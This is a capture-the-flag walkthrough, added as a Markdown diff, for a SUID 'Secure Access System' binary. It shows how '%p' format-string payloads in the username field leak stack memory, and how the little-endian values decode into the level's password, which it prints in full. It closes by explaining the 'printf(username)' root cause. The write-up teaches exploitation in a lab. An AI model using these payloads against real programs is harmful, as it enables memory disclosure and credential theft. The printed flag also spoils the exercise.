@@ -1,0 +1,113 @@
+# Level02 Walkthrough
+
+## Initial Enumeration
+
+After connecting to the machine and switching to `level02`, I started by enumerating files in the directory. I found a 64-bit ELF binary named `level02` with the SUID bit set:
+
+```bash
+$ ls -l
+-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
+```
+
+Since the binary was SUID, it was likely intended to run with elevated privileges, making it an interesting target.
+
+## Testing the Binary
+
+Executing the binary presented a login prompt:
+
+```text
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username:
+--[ Password:
+```
+
+The program appeared to require a username and password, with the password likely being the flag.
+
+## Discovering the Format String Vulnerability
+
+To test for common vulnerabilities, I supplied format string specifiers as the username:
+
+```text
+--[ Username: %p%p%p
+--[ Password: pass
+```
+
+The program responded with:
+
+```text
+*****************************************
+0x7fffffffe4f0(nil)0x70 does not have access!
+```
+
+Instead of printing the literal `%p` characters, the application interpreted them as format specifiers and printed memory addresses. This confirmed the presence of a **format string vulnerability** in the username field.
+
+## Leaking Memory
+
+To dump more memory, I increased the number of format specifiers:
+
+```text
+%p%p%p%p%p%p%p%p%p%p...
+```
+
+I repeated `%p` around 50 times and copied the resulting hexadecimal output.
+
+Example:
+
+```text
+0x41414141 0x67616c66 0x7b...
+```
+
+The leaked data contained values from the process memory, including what appeared to be portions of the password/flag.
+
+## Extracting the Flag
+
+Among the leaked stack values, several addresses did not look like pointers. Instead, they appeared to contain printable ASCII data:
+
+```text
+0x756e505234376848
+0x45414a3561733951
+0x377a7143574e6758
+0x354a35686e475873
+0x48336750664b394d
+```
+
+Since the binary is running on an x86-64 system, the values are stored in little-endian format. Reversing the byte order of each 64-bit value reveals the original characters:
+
+```text
+0x756e505234376848 -> Hh74RPnu
+0x45414a3561733951 -> Q9sa5JAE
+0x377a7143574e6758 -> XgNWCqz7
+0x354a35686e475873 -> sXGnh5J5
+0x48336750664b394d -> M9KfPg3H
+```
+
+Combining the decoded strings gives:
+
+```text
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+This value was the password stored on the stack and therefore the flag.
+
+### Root Cause
+
+The username field was passed directly to a formatted output function such as:
+
+```c
+printf(username);
+```
+
+instead of:
+
+```c
+printf("%s", username);
+```
+
+As a result, user-controlled format specifiers (`%p`) were interpreted by `printf`, allowing arbitrary stack values to be disclosed. By repeatedly printing stack contents and decoding the leaked data, the flag could be recovered without knowing the password beforehand.
+
+## Conclusion
+
+The vulnerability was a classic **format string vulnerability** in the username field. By supplying multiple `%p` specifiers, I was able to leak stack memory contents. Decoding the leaked hexadecimal values and accounting for little-endian byte ordering revealed the password stored in memory, which was also the flag.
